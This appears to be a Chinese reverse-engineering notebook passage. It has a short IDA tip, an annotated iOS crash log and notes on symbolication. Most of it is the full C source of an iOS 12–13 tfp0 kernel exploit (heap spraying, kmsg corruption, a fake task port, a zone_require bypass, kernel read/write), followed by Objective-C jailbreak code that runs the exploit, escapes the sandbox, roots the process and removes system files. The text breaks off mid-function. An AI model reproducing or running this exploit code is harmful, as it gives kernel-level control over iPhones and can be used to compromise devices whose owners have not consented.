	// ...
}
由于dword_40E000看似为0，所以，反编译器会优化掉这个分支。对此，我们需要修改.r_only段属性：打开Program Segmentation窗口(view-Open subviews-Segment)-右键.rdata段-Edit segment-Segment permissions-勾选Write


再次F5，被IDA吞掉的分支就会出现。
对于全局变量，在IDA view窗口设置变量类型，为其添加volatile声明；对于栈变量，双击变量，进入Stack窗口-右键-Set type-Please enter string

## iOS Exception Log
```
Date/Time:           2020-07-29 01:39:07.0825 +0800
Launch Time:         2020-07-29 01:38:59.6953 +0800
OS Version:          iPhone OS 13.4.1 (17E262)
Release Type:        User
Baseband Version:    4.02.02
Report Version:      104

Exception Type:  EXC_BAD_ACCESS (SIGSEGV)   //异常的类型
Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000528   //异常子类型
VM Region Info: 0x528 is not in any region.  Bytes before following region: 4296030936
      REGION TYPE                      START - END             [ VSIZE] PRT/MAX SHRMOD  REGION DETAIL
      UNUSED SPACE AT START
--->  
      __TEXT                 0000000100104000-0000000100c68000 [ 11.4M] r-x/r-x SM=COW  ...cyqp.app/cyqp

Termination Signal: Segmentation fault: 11
Termination Reason: Namespace SIGNAL, Code 0xb      //终止原因
Terminating Process: exc handler [424]
Triggered by Thread:  0

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:  //异常发生的线程(0为主线程，其他为子线程)

Exception Type:   EXC_CRASH (SIGKILL)                     //异常的类型
Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000118  //异常子类型
Exception Code: 0x0000000000000000, 0x0000000000000000     //异常地址
Exception Note: EXC_CORPSE_NOTIFY//描述
Termination reason:Namespace SPRINGBOARD, Code 0x8badf00d   //终止原因

Triggered by Thread:  0                    //异常发生的线程(0为主线程，其他为子线程)

```

# iOS符号化（Symbolication）

从iOS设备中检索到的崩溃日志只有可执行代码在加载的二进制映像（Binary Images）中的十六进制地址，是没有包含方法或函数名称的，而这些方法和函数的名称被称为符号

将回溯的地址解析为源码的方法和行号被称为符号化 ，这过程需要上传到AppStore的应用的二进制文件和编译二进制文件时生成的.dSYM文件。


## Cydia就是一个移植到ARM上的debian系统的APT管理器 = Debian APT

# iOS 12.0-13.3 tfp0
tfp0本质上是一种在内核内存中获取读写权限的方法，这是Apple极力尝试混淆的一种方法。
由于操作系统从属于内核运行，因此可以越狱，从而实现系统范围的自定义。
```
int get_tfp0() {
    void *data = NULL;
    mach_port_t ports[200] = {};
    mach_port_t new_tfp0 = MACH_PORT_NULL;
    
    int ret = init_offsets();
    if (ret) {
        printf("[-] iOS version not supported\n");
        goto err;
    }
    printf("[*] Initialized offsets\n");
    
    ret = init_IOAccelerator();
    if (ret) {
        printf("[-] Failed to init IOAccelerator\n");
        goto err;
    }
    printf("[*] Initialized IOAccelerator\n");
    
    ret = init_IOSurface();
    if (ret) {
        printf("[-] Failed to init IOSurface\n");;
        goto err;
    }
    printf("[*] Initialized IOSurface\n");
    
    // setup 200 ports for later use
    for (int i = 0; i < 200; i++) {
        ports[i] = new_mach_port();
    }
    int port_i = 0;
#define POP_PORT() ports[port_i++]
        
    
    // ----------- heap pre-exploit setup ----------- //
    
    printf("[*] Doing stage 0 heap setup\n");

    // ten thousand functions just for 20 lines of code bazad??
    
    // fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();
        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            if (ret) {
                printf("[-] Failed to send message\n");
                goto err;
            }
        }
    }
    
    free(data);
    data = NULL;
    
    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);
    
    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {
        kern_return_t ret = send_message(spray, data, msg_size);
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }
   
    // ----------- heap stage 1 setup -----------//
    
    printf("[*] Doing stage 1 heap setup\n");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        printf("[-] Failed to allocate empty kalloc buffer\n");
        goto err;
    }
    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    ret = alloc_shmem(96 MB, &cmdbuf, &seglist);
    if (ret) {
        printf("[-] Failed to allocate shared memory\n");
        goto err;
    }
    
    // heap now:
    // ------------------+------------------+------------------+----------------
    //     huge kalloc   |   segment list   |  command buffer  |
    // ------------------+------------------+------------------+----------------
    //
    
    // port which we will later corrupt. should be exactly after command buffer
    mach_port_t corrupted_kmsg_port = POP_PORT();
    ret = send_message(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }
    
    // now:
    // ------------------+------------------+------------------+-----------------+-----------
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
    // ------------------+------------------+------------------+-----------------+-----------
    //
    
    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
    mach_port_t placeholder_message_port = POP_PORT();
    ret = send_message(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        printf("[-] Failed to send message\n");
        goto err;
    }
    
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
    ret = send_ool_ports(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
    if (ret) {
        printf("[-] Failed to send ool ports message\n");
        goto err;
    }
    
    // now:
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //
    
    // free huge allocation
    ret = IOSurface_remove_property(huge_kalloc_key);
    if (ret) {
        printf("[-] Failed to remove IOSurface property\n");
        goto err;
    }
    
    // now:
    // ------------+------------------+------------------+-----------------+-------------------+-----------+
    //     free    |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------+------------------+------------------+-----------------+-------------------+-----------+
    //
    
    void *spray_buffer = ((uint8_t *) cmdbuf.data) + pagesize;

    uint32_t kfree_buffer_key = transpose(property_index++);
    memset(spray_buffer, 0x42, 8 * pagesize); // we'll need later in clean up to check if memory is still allocated
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), kfree_buffer_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }
    
    mach_port_destroy(mach_task_self(), placeholder_message_port);
    
    // now:
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg |  free  | ool ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    //
    
    uint32_t spray_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), spray_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }
    
    // now:
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg | spray_buffer | ool_ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    //
    
    size_t minimum_corrupted_size = 3 * (8 * pagesize) - 0x58; // 0x5ffa8 on 16K and 0x17fa8 on 4K
    
retry:;
    int overflow_size = 0;
    uint64_t ts = mach_absolute_time();
    if (minimum_corrupted_size < ts && ts <= ((minimum_corrupted_size << 8) | 0xff)) {
        overflow_size = 8;
    }
    else if (((minimum_corrupted_size << 8) | 0xff) < ts && ts <= ((minimum_corrupted_size << 16) | 0xffff)) {
        overflow_size = 7;
    }
    else if (((minimum_corrupted_size << 16) | 0xffff) < ts && ts <= ((minimum_corrupted_size << 24) | 0xffffff)) {
        overflow_size = 6;
    }
    else if (((minimum_corrupted_size << 24) | 0xffffff) < ts && ts <= ((minimum_corrupted_size << 32) | 0xffffffff)) {
        overflow_size = 5;
    }
    else if (((minimum_corrupted_size << 32) | 0xffffffff) < ts && ts <= ((minimum_corrupted_size << 36) | 0xffffffffff)) {
        overflow_size = 4;
    }
    else if (((minimum_corrupted_size << 36) | 0xffffffffff) < ts && ts <= ((minimum_corrupted_size << 40) | 0xffffffffffff)) {
        overflow_size = 3;
    }
    
    uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow_size)));
    if (ipc_kmsg_size < (minimum_corrupted_size + 1) || ipc_kmsg_size > 0x0400a8ff) {
        printf("[-] Probably won't work with this timestamp, retrying...\n");
        usleep(100);
        goto retry;
    }
    
    printf("[*] Triggering bug with %d bytes\n", overflow_size);
    overflow_n_bytes(96 MB, overflow_size, &cmdbuf, &seglist);
    printf("[*] Corruption worked?\n");

    mach_port_destroy(mach_task_self(), corrupted_kmsg_port);
    printf("[*] Freed kmsg\n");
    
    mach_port_t message_leaking_port = POP_PORT();
    
    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //
    
    for (int i = 0; i < 1024; i++) {
        ret = send_message(message_leaking_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
        if (ret) {
            printf("[-] Failed to send message\n");
            goto err;
        }
    }
    
    mach_port_t message_leaking_port_2 = MACH_PORT_NULL;
    if (pagesize == 0x1000) {
        message_leaking_port_2 = POP_PORT();
        for (int i = 0; i < 1024; i++) {
            ret = send_message(message_leaking_port_2, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
            if (ret) {
                printf("[-] Failed to send message\n");
                goto err;
            }
        }
    }
    
    // now:
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    // |   segment list   |  command buffer  | ipc_kmsg | ipc_kmsg | ipc_kmsg | ipc_kmsg | part of kfree_buffer |
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    //
    
    free(data);
    data = NULL;
    
    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *in = malloc(argsSz);
    bzero(in, argsSz);
    in->surface_id = IOSurface_ID;
    in->binary[0] = spray_key;
    in->binary[1] = 0;
    
    // this buffer is now an ipc_kmsg struct, read it back
    size_t out_size = 82 MB; // make it bigger than actual; that works for both cases
    ret = IOSurface_getValue(in, 16, spray_buffer, &out_size);
    if (ret) {
        printf("[-] Failed to read back value\n");
        goto err;
    }
    
    free(in);
    
    uint32_t ikm_size = 8 * (uint32_t)pagesize - 0x58;
    void *ipc_kmsg = memmem(spray_buffer, out_size, &ikm_size, sizeof(ikm_size));
    if (!ipc_kmsg) {
        printf("[-] Failed to leak ipc_kmsg\n");
        goto err;
    }
    
    // ikm_header = beginning of struct + something, we can use this to calculate the address of the shared memory buffer
    uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
    uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * pagesize - 2 * pagesize - 0x28;
    
    printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
    printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
    
    uint64_t fake_port_page_addr = segment_list_addr + 96 MB; // = addr of command buffer
    uint64_t fake_port_addr = fake_port_page_addr + 0x100;
    
    uint64_t fake_task_page_addr = segment_list_addr + pagesize + 96 MB; // = addr of command buffer + pagesize
    uint64_t fake_task_addr = fake_task_page_addr + 0x100;
    
    data = malloc(8 * pagesize);
    for (int i = 0; i < 8 * pagesize / 8; i++) {
        ((uint64_t*)data)[i] = fake_port_addr;
    }
    
    mach_port_destroy(mach_task_self(), message_leaking_port);
    if (message_leaking_port_2) mach_port_destroy(mach_task_self(), message_leaking_port_2);
    
    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //
    
    uint32_t ool_ports_realloc_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(data, 8 * pagesize, 1000, ool_ports_realloc_key);
    if (ret) {
        printf("[-] Failed to spray\n");
        goto err;
    }

    // bazad's fix for a kernel data abort
    make_buffer_readable_by_kernel(cmdbuf.data, 2);
    memset(cmdbuf.data, 0, 2 * pagesize);
    
    // setup fake port & fake task
    kport_t *fake_port = cmdbuf.data + 0x100;
    ktask_t *fake_task = cmdbuf.data + pagesize + 0x100;
        
    uint8_t *fake_port_page = cmdbuf.data;
    uint8_t *fake_task_page = cmdbuf.data + pagesize;

    // zone_require bypass
    *(fake_port_page + 0x16) = 42;
#if __arm64e__
    *(fake_task_page + 0x16) = 57;
#else
    *(fake_task_page + 0x16) = 58;
#endif
        
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xd00d;
    fake_port->ip_lock.type = 0x11;
    fake_port->ip_messages.port.receiver_name = 1;
    fake_port->ip_messages.port.msgcount = 0;
    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fake_port->ip_srights = 99;
    fake_port->ip_kobject = fake_task_addr;
        
    fake_task->ref_count = 0xff;
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    
    // receive back the fake ports
    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    free(ool);
    
    mach_port_t fakeport = ((mach_port_t *)ool->ool_ports.address)[0];
    if (!fakeport) {
        printf("[-] Didn't get fakeport???\n");
        goto err;
    }
    
    printf("[+] fakeport: 0x%x\n", fakeport);
    
    // will use cuck00 until i figure out why MACH_MSG_TYPE_MOVE_RECEIVE triggers a zone_require panic
    // why does this not work with mach_task_self()
    uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
    if (!leaked_port_addr) {
        printf("[-] Failed to leak port address\n");
        goto err;
    }
    printf("[+] Leaked port: 0x%llx\n", leaked_port_addr);

    // ----------- kernel read ----------- //
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#define kr32(addr) rk32_via_fakeport(fakeport, read_addr_ptr, addr)
#define kr64(addr) rk64_via_fakeport(fakeport, read_addr_ptr, addr)

    uint64_t ipc_space = kr64(leaked_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space) {
        printf("[-] Kernel read failed!\n");
        goto err;
    }
    printf("[+] Got kernel read\n");
    
    uint64_t kernel_vm_map = 0;
    uint64_t ipc_space_kernel = 0;
    uint64_t our_port_addr = 0;
    
    uint64_t struct_task = kr64(ipc_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TASK));
    our_port_addr = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF));
    ipc_space_kernel = kr64(our_port_addr + offsetof(kport_t, ip_receiver));
    
    while (struct_task) {
        uint64_t bsd_info = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));

        int pid = kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        if (pid == 0) {
            kernel_vm_map = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
            break;
        }
        
        struct_task = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    
    printf("[+] Our task port: 0x%llx\n", our_port_addr);
    
    // ----------- tfp0! ----------- //
    
    fake_port->ip_receiver = ipc_space_kernel;
    *(uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
    
    printf("[+] Updated port for tfp0!\n");
    
    init_kernel_memory(fakeport, our_port_addr);
    
    uint64_t addr = kalloc(8);
    if (!addr) {
        printf("[-] Seems like tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[*] Allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    uint64_t readb = rk64(addr);
    kfree(addr, 8);
    printf("[*] Read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] Read back value didn't match\n");
        goto err;
    }
    
    printf("[*] Creating safer port\n");
    
    new_tfp0 = POP_PORT();
    if (!new_tfp0) {
        printf("[-] Failed to allocate new tfp0 port\n");
        goto err;
    }
    
    uint64_t new_addr = find_port(new_tfp0);
    if (!new_addr) {
        printf("[-] Failed to find new tfp0 port address\n");
        goto err;
    }
    
    uint64_t faketask = kalloc(pagesize);
    if (!faketask) {
        printf("[-] Failed to kalloc faketask\n");
        goto err;
    }
    
    kwrite(faketask, fake_task_page, pagesize);
    fake_port->ip_kobject = faketask + 0x100;
    
    kwrite(new_addr, (const void*)fake_port, sizeof(kport_t));
    
    printf("[*] Testing new tfp0 port\n");
    
    init_kernel_memory(new_tfp0, our_port_addr);
    
    addr = kalloc(8);
    if (!addr) {
        printf("[-] Seems like the new tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[+] tfp0: 0x%x\n", new_tfp0);
    printf("[*] Allocated: 0x%llx\n", addr);
    wk64(addr, 0x4141414141414141);
    readb = rk64(addr);
    kfree(addr, 8);
    printf("[*] Read back: 0x%llx\n", readb);
    
    if (readb != 0x4141414141414141) {
        printf("[-] Read back value didn't match\n");
        goto err;
    }
    
    // ----------- find kernel base ----------- //
    
    uint64_t IOSurface_port_addr = find_port(IOSurfaceRootUserClient);
    uint64_t IOSurface_object = rk64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t vtable = rk64(IOSurface_object);
    vtable |= 0xffffff8000000000; // in case it has PAC
    uint64_t function = rk64(vtable + 8 * koffset(OFFSET_GETFI));
    function |= 0xffffff8000000000; // this address is inside the kernel image
    uint64_t page = trunc_page_kernel(function);
   
    while (true) {
        if (rk64(page) == 0x0100000cfeedfacf && (rk64(page + 8) == 0x0000000200000000 || rk64(page + 8) == 0x0000000200000002)) {
            kernel_base = page;
            break;
        }
        page -= pagesize;
    }
    
    printf("[*] Kernel base: 0x%llx\n", kernel_base);
    
    // ----------- clean up ----------- //

    printf("[-] Cleaning up...\n");
    uint64_t our_task_addr = rk64(our_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(our_task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = fakeport >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    // remove references to the first tfp0 port which is located in the command buffer
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
    fakeport = MACH_PORT_NULL;
    
    // remove our receive right of new_tfp0 to prevent it from dying on app exit
    port_index = new_tfp0 >> 8;
    uint32_t ie_bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8);
    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, ie_bits);
    
    // after this command buffer & segment list can be freed safely
    
    uint64_t spray_array = address_of_property_key(IOSurfaceRootUserClient, spray_key); // OSArray *
    uint32_t count = OSArray_objectCount(spray_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize) {
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setLength(object, 0); // null out the size, this buffer was freed & reallocated
            break;
        }
    }
    // now we should be able to free this
    IOSurface_remove_property(spray_key);
    
    uint64_t ool_array = address_of_property_key(IOSurfaceRootUserClient, ool_ports_realloc_key); // OSArray *
    count = OSArray_objectCount(ool_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize) {
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setLength(object, 0);
            break;
        }
    }
    IOSurface_remove_property(ool_ports_realloc_key);

    // in here only part of the buffer got freed, we don't know how much so the solution is more complex.
    // we need to check if each page is mapped and if so check if it was allocated by us and not freed and reallocated by the system.
    // when we find a page allocated by us it is safe to assume there won't be more corrupted pages since the corruption is contiguous
    uint64_t kfree_array = address_of_property_key(IOSurfaceRootUserClient, kfree_buffer_key); // OSArray *
    count = OSArray_objectCount(kfree_array);
    
    uint64_t start_of_corruption = segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize + 8 * pagesize;
    
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(kfree_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
    
        if (buffer >= start_of_corruption) {
            uint64_t page = 0;
            
            // 8 pages
            for (int p = 0; p < 8; p++) {
                page = buffer + p * pagesize;
                
                // if allocation doesn't work page is mapped, otherwise it's free
                ret = mach_vm_allocate(new_tfp0, &page, pagesize, VM_FLAGS_FIXED); // reallocate at same address
                if (ret) {
                    uint64_t readval = rk64(page);
                    if (readval == 0x4242424242424242) {
                        printf("[*] Fixing corrupted OSData buffer at 0x%llx\n", buffer);
                        
                        // fix it
                        OSData_setBuffer(object, page);
                        OSData_setLength(object, 8 * pagesize - (uint32_t)(page - buffer));
                        
                        // if we find a non-corrupted buffer stop
                        goto out;
                    }
                    else {
                        printf("[*] Part of buffer reallocated by the system, keeping\n");
                    }
                }
                else {
                    kfree(page, pagesize); // was freed already, so keep it freed
                }
            }
            
            // if we've reached this point object is corrupted entirely
            OSData_setLength(object, 0);
        }
    }
    
out:;
    IOSurface_remove_property(kfree_buffer_key);
    
err:;
    for (int i = 0; i < 200; i++) {
        if (ports[i] && ports[i] != new_tfp0) mach_port_destroy(mach_task_self(), ports[i]);
    }
    
    if (data) free(data);
    term_IOAccelerator();
    term_IOSurface();
    return new_tfp0;
}
```

## rootless Jailbreak 4
```
#import "ViewController.h"
#include "everythingElse.h"
#include "insert_dylib.h"

#include "jelbrekLib.h"
#include "libjb.h"
#include "payload.h"

#import <mach/mach.h>
#import <sys/stat.h>
#import <sys/utsname.h>
#import <dlfcn.h>
#include "vnode.h"
#include "offsetsDump.h"

#define LOG(string, args...) do {\
printf(string "\n", ##args); \
} while (0)


#define in_bundle(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])

#define failIf(condition, message, ...) if (condition) {\
}

#define maxVersion(v)  ([[[UIDevice currentDevice] systemVersion] compare:@v options:NSNumericSearch] != NSOrderedDescending)


#define fileExists(file) [[NSFileManager defaultManager] fileExistsAtPath:@(file)]

#define removeFile(file) if (fileExists(file)) {\
[[NSFileManager defaultManager]  removeItemAtPath:@(file) error:NULL]; \
}


#define copyFile(copyFrom, copyTo) [[NSFileManager defaultManager] copyItemAtPath:@(copyFrom) toPath:@(copyTo) error:NULL]; \

#define moveFile(copyFrom, moveTo) [[NSFileManager defaultManager] moveItemAtPath:@(copyFrom) toPath:@(moveTo) error:NULL]; \




@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *jbtext;
@property (weak, nonatomic) IBOutlet UIButton *unjbtext;
@property (weak, nonatomic) IBOutlet UISwitch *tweaks;
@property (weak, nonatomic) IBOutlet UISwitch *filza;
@property (weak, nonatomic) IBOutlet UISwitch *ReProvision;
@property (weak, nonatomic) IBOutlet UISwitch *removeSwitch;


@end

@implementation ViewController

struct utsname u;
vm_size_t psize;
int csops(pid_t pid, unsigned int  ops, void * useraddr, size_t usersize);



BOOL debug = true;

uint32_t flags;

- (void)viewDidLoad {
    [super viewDidLoad];
    
    csops(getpid(), 0, &flags, 0);
    
    if ((flags & 0x4000000)) { // platform
        [self.jbtext setTitle:@"已越狱" forState:UIControlStateNormal];
        [self.jbtext setEnabled:NO];
    }
    
    uname(&u);
    if (strstr(u.machine, "iPad5,")) psize = 0x1000;
    else _host_page_size(mach_host_self(), &psize);
}


- (void)resignAndInjectToTrustCache:(NSString *)path ents:(NSString *)ents
{
    ents = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/data/ents/entitlements_%@", ents];
    NSString *p = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/usr/local/bin/jtool --sign --inplace --ent %@ %@", ents, path];
    char *p_ = (char *)[p UTF8String];
    system_(p_);
    
    
    p = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/usr/bin/inject %@", path];
    char *pp_ = (char *)[p UTF8String];
    system_(pp_);
    
    printf("[S] %s\n", p_);
}

- (void)resignAndInjectToTrustCacheSaily:(NSString *)path ents:(NSString *)ents
{
    
    printf("[-] Do not install Saily.app in the jailbreak process.\n[-] Dylib and frameworks should not be able to local sign.\n[-] And they do not call fixmMap in their load process.\n");
    
//    ents = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/Applications/Saily.app/%@", ents];
//    NSString *p = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/usr/local/bin/jtool --sign --inplace --ent %@ %@", ents, path];
//    char *p_ = (char *)[p UTF8String];
//    system_(p_);
//
//    p = [NSString stringWithFormat:@"/var/containers/Bundle/tweaksupport/usr/bin/inject %@", path];
//    char *pp_ = (char *)[p UTF8String];
//    system_(pp_);
//
//    printf("[S] %s\n", p_);
}





int system_(char *cmd) {
    return launch("/var/bin/bash", "-c", cmd, NULL, NULL, NULL, NULL, NULL);
}


NSError *error = NULL;
NSArray *plists;



- (int)extracted {
    return setHSP4();
}

-(void)uninstall {
    
    [[UIApplication sharedApplication] beginIgnoringInteractionEvents];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"1/3"
             
                            forState:UIControlStateNormal];
            
        });
        
        
        // MARK: EXPLOIT
        if (runExploit((__bridge void *)(self)) == false){
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_unjbtext setTitle:@"Exploit Failed" forState:UIControlStateNormal];
                err_exploit((__bridge void *)(self));
                
            });
            return;
        }
        
        if (escapeSandbox() == false){
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_unjbtext setTitle:@"Error: Sandbox" forState:UIControlStateNormal];
                err_exploit((__bridge void *)(self));
            });
            return;
        }
        
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"2/3" forState:UIControlStateNormal];
        });
        
        
        init_with_kbase(tfp0, kbase);
        
        
        
        //unsandbox(getpid());
        printf("Unsandboxed\n");
        
        rootify(getpid());
        printf("rooted\n");
        
        setHSP4();
        
        //[self extracted];
        
        setcsflags(getpid()); // set some csflags
        platformize(getpid()); // set TF_PLATFORM
        
        LOG("[*] Uninstalling...");
        
        // Just fucking do this
        failIf(!fileExists("/var/containers/Bundle/.installed_rootlessJB3"), "[-] rootlessJB was never installed before! (this version of it)");
        
        
        
       
        removeFile("/var/LIB");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/LIB" forState:UIControlStateNormal];
            
        });
        removeFile("/var/ulb");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/ulb" forState:UIControlStateNormal];
            
        });
        removeFile("/var/bin");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/bin" forState:UIControlStateNormal];
            
        });
        removeFile("/var/sbin");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/sbin" forState:UIControlStateNormal];
            
        });
        removeFile("/var/libexec");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/libexec" forState:UIControlStateNormal];
            
        });
        removeFile("/var/containers/Bundle/tweaksupport/Applications");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning Applications" forState:UIControlStateNormal];
            
        });
        removeFile("/var/Apps");
        removeFile("/var/profile");
        dispatch_async(dispatch_get_main_queue(), ^{
